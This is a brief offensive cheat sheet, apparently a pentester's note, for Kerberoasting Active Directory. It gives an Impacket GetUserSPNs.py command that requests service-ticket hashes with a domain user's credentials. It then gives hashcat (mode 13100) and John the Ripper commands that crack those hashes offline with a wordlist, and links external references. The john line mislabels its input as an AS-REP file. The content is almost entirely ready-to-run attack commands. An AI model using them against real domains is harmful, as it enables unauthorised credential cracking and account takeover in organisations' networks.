## Kerberos ticket generation and crack password Using Impacket module

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

```
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```

Cracking password

```
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```

Impacket tool reference
https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/
